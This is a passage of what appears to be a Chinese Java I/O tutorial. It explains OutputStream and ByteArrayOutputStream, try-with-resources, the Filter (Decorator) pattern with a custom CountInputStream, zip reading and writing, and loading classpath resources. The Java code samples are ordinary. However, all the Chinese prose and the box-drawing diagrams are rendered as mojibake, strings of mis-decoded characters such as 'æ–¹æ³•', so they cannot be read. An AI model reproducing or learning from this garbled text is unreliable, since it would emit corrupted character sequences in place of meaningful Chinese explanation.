·ï¼ŒOutputStreamçš„write()æ–¹æ³•ä¹Ÿæ˜¯é˜»å¡çš„ã€‚ OutputStreamå®ç°ç±»ç”¨FileOutputStreamå¯ä»¥ä»æ–‡ä»¶è·å–è¾“å‡ºæµï¼Œè¿™æ˜¯OutputStreamå¸¸ç”¨çš„ä¸€ä¸ªå®ç°ç±»ã€‚æ­¤å¤–ï¼ŒByteArrayOutputStreamå¯ä»¥åœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿä¸€ä¸ªOutputStreamï¼š import java.io.*; public class Main { public static void main(String[] args) throws IOException { byte[] data; try (ByteArrayOutputStream output = new ByteArrayOutputStream()) { output.write(&quot;Hello &quot;.getBytes(&quot;UTF-8&quot;)); output.write(&quot;world!&quot;.getBytes(&quot;UTF-8&quot;)); data = output.toByteArray(); } System.out.println(new String(data, &quot;UTF-8&quot;)); } } ByteArrayOutputStreamå®é™…ä¸Šæ˜¯æŠŠä¸€ä¸ªbyte[]æ•°ç»„åœ¨å†…å­˜ä¸­å˜æˆä¸€ä¸ªOutputStreamï¼Œè™½ç„¶å®é™…åº”ç”¨ä¸å¤šï¼Œä½†æµ‹è¯•çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨å®ƒæ¥æ„é€ ä¸€ä¸ªOutputStreamã€‚ åŒæ—¶æ“ä½œå¤šä¸ªAutoCloseableèµ„æºæ—¶ï¼Œåœ¨try(resource) { ... }è¯­å¥ä¸­å¯ä»¥åŒæ—¶å†™å‡ºå¤šä¸ªèµ„æºï¼Œç”¨;éš”å¼€ã€‚ä¾‹å¦‚ï¼ŒåŒæ—¶è¯»å†™ä¸¤ä¸ªæ–‡ä»¶ï¼š // è¯»å–input.txtï¼Œå†™å…¥output.txt: try (InputStream input = new FileInputStream(&quot;input.txt&quot;); OutputStream output = new FileOutputStream(&quot;output.txt&quot;)) { input.transferTo(output); // transferToçš„ä½œç”¨æ˜¯? } å°ç»“Javaæ ‡å‡†åº“çš„java.io.OutputStreamå®šä¹‰äº†æ‰€æœ‰è¾“å‡ºæµçš„è¶…ç±»ï¼š FileOutputStreamå®ç°äº†æ–‡ä»¶æµè¾“å‡ºï¼› ByteArrayOutputStreamåœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿä¸€ä¸ªå­—èŠ‚æµè¾“å‡ºã€‚ æŸäº›æƒ…å†µä¸‹éœ€è¦æ‰‹åŠ¨è°ƒç”¨OutputStreamçš„flush()æ–¹æ³•æ¥å¼ºåˆ¶è¾“å‡ºç¼“å†²åŒºã€‚ æ€»æ˜¯ä½¿ç”¨try(resource)æ¥ä¿è¯OutputStreamæ­£ç¡®å…³é—­ã€‚ Filteræ¨¡å¼Javaçš„IOæ ‡å‡†åº“æä¾›çš„InputStreamæ ¹æ®æ¥æºå¯ä»¥åŒ…æ‹¬ï¼š FileInputStreamï¼šä»æ–‡ä»¶è¯»å–æ•°æ®ï¼Œæ˜¯æœ€ç»ˆæ•°æ®æºï¼› ServletInputStreamï¼šä»HTTPè¯·æ±‚è¯»å–æ•°æ®ï¼Œæ˜¯æœ€ç»ˆæ•°æ®æºï¼› Socket.getInputStream()ï¼šä»TCPè¿æ¥è¯»å–æ•°æ®ï¼Œæ˜¯æœ€ç»ˆæ•°æ®æºï¼› â€¦ å¦‚æœæˆ‘ä»¬è¦ç»™FileInputStreamæ·»åŠ ç¼“å†²åŠŸèƒ½ï¼Œåˆ™å¯ä»¥ä»FileInputStreamæ´¾ç”Ÿä¸€ä¸ªç±»ï¼š BufferedFileInputStream extends FileInputStream å¦‚æœè¦ç»™FileInputStreamæ·»åŠ è®¡ç®—ç­¾åçš„åŠŸèƒ½ï¼Œç±»ä¼¼çš„ï¼Œä¹Ÿå¯ä»¥ä»FileInputStreamæ´¾ç”Ÿä¸€ä¸ªç±»ï¼š DigestFileInputStream extends FileInputStream å¦‚æœè¦ç»™FileInputStreamæ·»åŠ åŠ å¯†/è§£å¯†åŠŸèƒ½ï¼Œè¿˜æ˜¯å¯ä»¥ä»FileInputStreamæ´¾ç”Ÿä¸€ä¸ªç±»ï¼š CipherFileInputStream extends FileInputStream å¦‚æœè¦ç»™FileInputStreamæ·»åŠ ç¼“å†²å’Œç­¾åçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦æ´¾ç”ŸBufferedDigestFileInputStreamã€‚å¦‚æœè¦ç»™FileInputStreamæ·»åŠ ç¼“å†²å’ŒåŠ è§£å¯†çš„åŠŸèƒ½ï¼Œåˆ™éœ€è¦æ´¾ç”ŸBufferedCipherFileInputStreamã€‚ æˆ‘ä»¬å‘ç°ï¼Œç»™FileInputStreamæ·»åŠ 3ç§åŠŸèƒ½ï¼Œè‡³å°‘éœ€è¦3ä¸ªå­ç±»ã€‚è¿™3ç§åŠŸèƒ½çš„ç»„åˆï¼Œåˆéœ€è¦æ›´å¤šçš„å­ç±»ï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ FileInputStream â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”‚ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚BufferedFileInputStreamâ”‚â”‚â”‚DigestInputStreamâ”‚â”‚â”‚CipherFileInputStreamâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚BufferedDigestFileInputStreamâ”‚ â”‚BufferedCipherFileInputStreamâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ è¿™è¿˜åªæ˜¯é’ˆå¯¹FileInputStreamè®¾è®¡ï¼Œå¦‚æœé’ˆå¯¹å¦ä¸€ç§InputStreamè®¾è®¡ï¼Œå¾ˆå¿«ä¼šå‡ºç°å­ç±»çˆ†ç‚¸çš„æƒ…å†µã€‚ å› æ­¤ï¼Œç›´æ¥ä½¿ç”¨ç»§æ‰¿ï¼Œä¸ºå„ç§InputStreamé™„åŠ æ›´å¤šçš„åŠŸèƒ½ï¼Œæ ¹æœ¬æ— æ³•æ§åˆ¶ä»£ç çš„å¤æ‚åº¦ï¼Œå¾ˆå¿«å°±ä¼šå¤±æ§ã€‚ ä¸ºäº†è§£å†³ä¾èµ–ç»§æ‰¿ä¼šå¯¼è‡´å­ç±»æ•°é‡å¤±æ§çš„é—®é¢˜ï¼ŒJDKé¦–å…ˆå°†InputStreamåˆ†ä¸ºä¸¤å¤§ç±»ï¼š ä¸€ç±»æ˜¯ç›´æ¥æä¾›æ•°æ®çš„åŸºç¡€InputStreamï¼Œä¾‹å¦‚ï¼š FileInputStream ByteArrayInputStream ServletInputStream â€¦ ä¸€ç±»æ˜¯æä¾›é¢å¤–é™„åŠ åŠŸèƒ½çš„InputStreamï¼Œä¾‹å¦‚ï¼š BufferedInputStream DigestInputStream CipherInputStream â€¦ å½“æˆ‘ä»¬éœ€è¦ç»™ä¸€ä¸ªâ€œåŸºç¡€â€InputStreamé™„åŠ å„ç§åŠŸèƒ½æ—¶ï¼Œæˆ‘ä»¬å…ˆç¡®å®šè¿™ä¸ªèƒ½æä¾›æ•°æ®æºçš„InputStreamï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦çš„æ•°æ®æ€»å¾—æ¥è‡ªæŸä¸ªåœ°æ–¹ï¼Œä¾‹å¦‚ï¼ŒFileInputStreamï¼Œæ•°æ®æ¥æºè‡ªæ–‡ä»¶ï¼š InputStream file = new FileInputStream(&quot;test.gz&quot;); ç´§æ¥ç€ï¼Œæˆ‘ä»¬å¸Œæœ›FileInputStreamèƒ½æä¾›ç¼“å†²çš„åŠŸèƒ½æ¥æé«˜è¯»å–çš„æ•ˆç‡ï¼Œå› æ­¤æˆ‘ä»¬ç”¨BufferedInputStreamåŒ…è£…è¿™ä¸ªInputStreamï¼Œå¾—åˆ°çš„åŒ…è£…ç±»å‹æ˜¯BufferedInputStreamï¼Œä½†å®ƒä»ç„¶è¢«è§†ä¸ºä¸€ä¸ªInputStreamï¼š InputStream buffered = new BufferedInputStream(file); æœ€åï¼Œå‡è®¾è¯¥æ–‡ä»¶å·²ç»ç”¨gzipå‹ç¼©äº†ï¼Œæˆ‘ä»¬å¸Œæœ›ç›´æ¥è¯»å–è§£å‹ç¼©çš„å†…å®¹ï¼Œå°±å¯ä»¥å†åŒ…è£…ä¸€ä¸ªGZIPInputStreamï¼š InputStream gzip = new GZIPInputStream(buffered); æ— è®ºæˆ‘ä»¬åŒ…è£…å¤šå°‘æ¬¡ï¼Œå¾—åˆ°çš„å¯¹è±¡å§‹ç»ˆæ˜¯InputStreamï¼Œæˆ‘ä»¬ç›´æ¥ç”¨InputStreamæ¥å¼•ç”¨å®ƒï¼Œå°±å¯ä»¥æ­£å¸¸è¯»å–ï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚GZIPInputStream â”‚ â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”‚â”‚BufferedFileInputStreamâ”‚â”‚ â”‚â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚â”‚ â”‚â”‚â”‚ FileInputStream â”‚â”‚â”‚ â”‚â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚â”‚ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ ä¸Šè¿°è¿™ç§é€šè¿‡ä¸€ä¸ªâ€œåŸºç¡€â€ç»„ä»¶å†å åŠ å„ç§â€œé™„åŠ â€åŠŸèƒ½ç»„ä»¶çš„æ¨¡å¼ï¼Œç§°ä¹‹ä¸ºFilteræ¨¡å¼ï¼ˆæˆ–è€…è£…é¥°å™¨æ¨¡å¼ï¼šDecoratorï¼‰ã€‚å®ƒå¯ä»¥è®©æˆ‘ä»¬é€šè¿‡å°‘é‡çš„ç±»æ¥å®ç°å„ç§åŠŸèƒ½çš„ç»„åˆï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ InputStream â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â–² â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ FileInputStream â”‚â”€â”¤ â””â”€â”‚FilterInputStreamâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â–² â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ByteArrayInputStreamâ”‚â”€â”¤ â”œâ”€â”‚BufferedInputStreamâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ ServletInputStream â”‚â”€â”˜ â”œâ”€â”‚ DataInputStream â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”‚CheckedInputStream â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ ç±»ä¼¼çš„ï¼ŒOutputStreamä¹Ÿæ˜¯ä»¥è¿™ç§æ¨¡å¼æ¥æä¾›å„ç§åŠŸèƒ½ï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚OutputStream â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â–² â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ FileOutputStream â”‚â”€â”¤ â””â”€â”‚FilterOutputStreamâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â–² â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ByteArrayOutputStreamâ”‚â”€â”¤ â”œâ”€â”‚BufferedOutputStreamâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ ServletOutputStream â”‚â”€â”˜ â”œâ”€â”‚ DataOutputStream â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”‚CheckedOutputStream â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ ç¼–å†™FilterInputStreamæˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±ç¼–å†™FilterInputStreamï¼Œä»¥ä¾¿å¯ä»¥æŠŠè‡ªå·±çš„FilterInputStreamâ€œå åŠ â€åˆ°ä»»ä½•ä¸€ä¸ªInputStreamä¸­ã€‚ ä¸‹é¢çš„ä¾‹å­æ¼”ç¤ºäº†å¦‚ä½•ç¼–å†™ä¸€ä¸ªCountInputStreamï¼Œå®ƒçš„ä½œç”¨æ˜¯å¯¹è¾“å…¥çš„å­—èŠ‚è¿›è¡Œè®¡æ•°ï¼š import java.io.*; public class Main { public static void main(String[] args) throws IOException { byte[] data = &quot;hello, world!&quot;.getBytes(&quot;UTF-8&quot;); try (CountInputStream input = new CountInputStream(new ByteArrayInputStream(data))) { int n; while ((n = input.read()) != -1) { System.out.println((char)n); } System.out.println(&quot;Total read &quot; + input.getBytesRead() + &quot; bytes&quot;); } } } class CountInputStream extends FilterInputStream { private int count = 0; CountInputStream(InputStream in) { super(in); } public int getBytesRead() { return this.count; } public int read() throws IOException { int n = in.read(); if (n != -1) { this.count ++; } return n; } public int read(byte[] b, int off, int len) throws IOException { int n = in.read(b, off, len); if (n != -1) { this.count += n; } return n; } } æ³¨æ„åˆ°åœ¨å åŠ å¤šä¸ªFilterInputStreamï¼Œæˆ‘ä»¬åªéœ€è¦æŒæœ‰æœ€å¤–å±‚çš„InputStreamï¼Œå¹¶ä¸”ï¼Œå½“æœ€å¤–å±‚çš„InputStreamå…³é—­æ—¶ï¼ˆåœ¨try(resource)å—çš„ç»“æŸå¤„è‡ªåŠ¨å…³é—­ï¼‰ï¼Œå†…å±‚çš„InputStreamçš„close()æ–¹æ³•ä¹Ÿä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œå¹¶æœ€ç»ˆè°ƒç”¨åˆ°æœ€æ ¸å¿ƒçš„â€œåŸºç¡€â€InputStreamï¼Œå› æ­¤ä¸å­˜åœ¨èµ„æºæ³„éœ²ã€‚ å°ç»“Javaçš„IOæ ‡å‡†åº“ä½¿ç”¨Filteræ¨¡å¼ä¸ºInputStreamå’ŒOutputStreamå¢åŠ åŠŸèƒ½ï¼š å¯ä»¥æŠŠä¸€ä¸ªInputStreamå’Œä»»æ„ä¸ªFilterInputStreamç»„åˆï¼› å¯ä»¥æŠŠä¸€ä¸ªOutputStreamå’Œä»»æ„ä¸ªFilterOutputStreamç»„åˆã€‚ Filteræ¨¡å¼å¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€å¢åŠ åŠŸèƒ½ï¼ˆåˆç§°Decoratoræ¨¡å¼ï¼‰ã€‚ æ“ä½œZipZipInputStreamæ˜¯ä¸€ç§FilterInputStreamï¼Œå®ƒå¯ä»¥ç›´æ¥è¯»å–zipåŒ…çš„å†…å®¹ï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ InputStream â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ FilterInputStream â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚InflaterInputStreamâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ ZipInputStream â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ JarInputStream â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ å¦ä¸€ä¸ªJarInputStreamæ˜¯ä»ZipInputStreamæ´¾ç”Ÿï¼Œå®ƒå¢åŠ çš„ä¸»è¦åŠŸèƒ½æ˜¯ç›´æ¥è¯»å–jaræ–‡ä»¶é‡Œé¢çš„MANIFEST.MFæ–‡ä»¶ã€‚å› ä¸ºæœ¬è´¨ä¸ŠjaråŒ…å°±æ˜¯zipåŒ…ï¼Œåªæ˜¯é¢å¤–é™„åŠ äº†ä¸€äº›å›ºå®šçš„æè¿°æ–‡ä»¶ã€‚ è¯»å–zipåŒ…æˆ‘ä»¬æ¥çœ‹çœ‹ZipInputStreamçš„åŸºæœ¬ç”¨æ³•ã€‚ æˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªZipInputStreamï¼Œé€šå¸¸æ˜¯ä¼ å…¥ä¸€ä¸ªFileInputStreamä½œä¸ºæ•°æ®æºï¼Œç„¶åï¼Œå¾ªç¯è°ƒç”¨getNextEntry()ï¼Œç›´åˆ°è¿”å›nullï¼Œè¡¨ç¤ºzipæµç»“æŸã€‚ ä¸€ä¸ªZipEntryè¡¨ç¤ºä¸€ä¸ªå‹ç¼©æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¦‚æœæ˜¯å‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±ç”¨read()æ–¹æ³•ä¸æ–­è¯»å–ï¼Œç›´åˆ°è¿”å›-1ï¼š try (ZipInputStream zip = new ZipInputStream(new FileInputStream(...))) { ZipEntry entry = null; while ((entry = zip.getNextEntry()) != null) { String name = entry.getName(); if (!entry.isDirectory()) { int n; while ((n = zip.read()) != -1) { ... } } } } å†™å…¥zipåŒ…ZipOutputStreamæ˜¯ä¸€ç§FilterOutputStreamï¼Œå®ƒå¯ä»¥ç›´æ¥å†™å…¥å†…å®¹åˆ°zipåŒ…ã€‚æˆ‘ä»¬è¦å…ˆåˆ›å»ºä¸€ä¸ªZipOutputStreamï¼Œé€šå¸¸æ˜¯åŒ…è£…ä¸€ä¸ªFileOutputStreamï¼Œç„¶åï¼Œæ¯å†™å…¥ä¸€ä¸ªæ–‡ä»¶å‰ï¼Œå…ˆè°ƒç”¨putNextEntry()ï¼Œç„¶åç”¨write()å†™å…¥byte[]æ•°æ®ï¼Œå†™å…¥å®Œæ¯•åè°ƒç”¨closeEntry()ç»“æŸè¿™ä¸ªæ–‡ä»¶çš„æ‰“åŒ…ã€‚ try (ZipOutputStream zip = new ZipOutputStream(new FileOutputStream(...))) { File[] files = ... for (File file : files) { zip.putNextEntry(new ZipEntry(file.getName())); zip.write(getFileDataAsBytes(file)); zip.closeEntry(); } } ä¸Šé¢çš„ä»£ç æ²¡æœ‰è€ƒè™‘æ–‡ä»¶çš„ç›®å½•ç»“æ„ã€‚å¦‚æœè¦å®ç°ç›®å½•å±‚æ¬¡ç»“æ„ï¼Œnew ZipEntry(name)ä¼ å…¥çš„nameè¦ç”¨ç›¸å¯¹è·¯å¾„ã€‚ å°ç»“ZipInputStreamå¯ä»¥è¯»å–zipæ ¼å¼çš„æµï¼ŒZipOutputStreamå¯ä»¥æŠŠå¤šä»½æ•°æ®å†™å…¥zipåŒ…ï¼› é…åˆFileInputStreamå’ŒFileOutputStreamå°±å¯ä»¥è¯»å†™zipæ–‡ä»¶ã€‚ è¯»å–classpathèµ„æºå¾ˆå¤šJavaç¨‹åºå¯åŠ¨çš„æ—¶å€™ï¼Œéƒ½éœ€è¦è¯»å–é…ç½®æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œä»ä¸€ä¸ª.propertiesæ–‡ä»¶ä¸­è¯»å–é…ç½®ï¼š String conf = &quot;C:\\\\conf\\\\default.properties&quot;; try (InputStream input = new FileInputStream(conf)) { // TODO: } è¿™æ®µä»£ç è¦æ­£å¸¸æ‰§è¡Œï¼Œå¿…é¡»åœ¨Cç›˜åˆ›å»ºconfç›®å½•ï¼Œç„¶ååœ¨ç›®å½•é‡Œåˆ›å»ºdefault.propertiesæ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œåœ¨Linuxç³»ç»Ÿä¸Šï¼Œè·¯å¾„å’ŒWindowsçš„åˆä¸ä¸€æ ·ã€‚ å› æ­¤ï¼Œä»ç£ç›˜çš„å›ºå®šç›®å½•è¯»å–é…ç½®æ–‡ä»¶ï¼Œä¸æ˜¯ä¸€ä¸ªå¥½çš„åŠæ³•ã€‚ æœ‰æ²¡æœ‰è·¯å¾„æ— å…³çš„è¯»å–æ–‡ä»¶çš„æ–¹å¼å‘¢ï¼Ÿ æˆ‘ä»¬çŸ¥é“ï¼ŒJavaå­˜æ”¾.classçš„ç›®å½•æˆ–jaråŒ…ä¹Ÿå¯ä»¥åŒ…å«ä»»æ„å…¶ä»–ç±»å‹çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚.propertiesï¼› å›¾ç‰‡æ–‡ä»¶ï¼Œä¾‹å¦‚.jpgï¼› æ–‡æœ¬æ–‡ä»¶ï¼Œä¾‹å¦‚.txtï¼Œ.csvï¼› â€¦â€¦ ä»classpathè¯»å–æ–‡ä»¶å°±å¯ä»¥é¿å…ä¸åŒç¯å¢ƒä¸‹æ–‡ä»¶è·¯å¾„ä¸ä¸€è‡´çš„é—®é¢˜ï¼šå¦‚æœæˆ‘ä»¬æŠŠdefault.propertiesæ–‡ä»¶æ”¾åˆ°classpathä¸­ï¼Œå°±ä¸ç”¨å…³å¿ƒå®ƒçš„å®é™…å­˜æ”¾è·¯å¾„ã€‚ åœ¨classpathä¸­çš„èµ„æºæ–‡ä»¶ï¼Œè·¯å¾„æ€»æ˜¯ä»¥ï¼å¼€å¤´ï¼Œæˆ‘ä»¬å…ˆè·å–å½“å‰çš„Classå¯¹è±¡ï¼Œç„¶åè°ƒç”¨getResourceAsStream()å°±å¯ä»¥ç›´æ¥ä»classpathè¯»å–ä»»æ„çš„èµ„æºæ–‡ä»¶ï¼š try (InputStream input = getClass().getResourceAsStream(&quot;/default.properties&quot;)) { // TODO: } è°ƒç”¨getResourceAsStream()éœ€è¦ç‰¹åˆ«æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œå¦‚æœèµ„æºæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå®ƒå°†è¿”å›nullã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ£€æŸ¥è¿”å›çš„InputStreamæ˜¯å¦ä¸ºnullï¼Œå¦‚æœä¸ºnullï¼Œè¡¨ç¤ºèµ„æºæ–‡ä»¶åœ¨classpathä¸­æ²¡æœ‰æ‰¾åˆ°ï¼š try (InputStream input = getClass().getResourceAsStream(&quot;/default.properties&quot;)) { if (input != null) { // TODO: } } å¦‚æœæˆ‘ä»¬æŠŠé»˜è®¤çš„é…ç½®æ”¾åˆ°jaråŒ…ä¸­ï¼Œå†ä»å¤–éƒ¨æ–‡ä»¶ç³»ç»Ÿè¯»å–ä¸€ä¸ªå¯é€‰çš„é…ç½®æ–‡ä»¶ï¼Œå°±å¯ä»¥åšåˆ°æ—¢æœ‰é»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œåˆå¯ä»¥è®©ç”¨æˆ·è‡ªå·±ä¿®æ”¹é…ç½®ï¼š Properties props = new Properties(); props.load(inputStreamFromClassPath(&quot;/default.properties&quot;)); props.load(inputStreamFromFile(&quot;./conf.properties&quot;)); è¿™æ ·è¯»å–é…ç½®æ–‡ä»¶ï¼Œåº”ç”¨ç¨‹åºå¯åŠ¨å°±æ›´åŠ çµæ´»ã€‚ å°ç»“æŠŠèµ„æºå­˜å‚¨åœ¨classpathä¸­å¯ä»¥é¿å…æ–‡ä»¶è·¯å¾„ä¾èµ–ï¼› Classå¯¹è±¡çš„getResourceAsStream()å¯ä»¥ä»classpathä¸­è¯»å–æŒ‡å®šèµ„æºï¼› æ 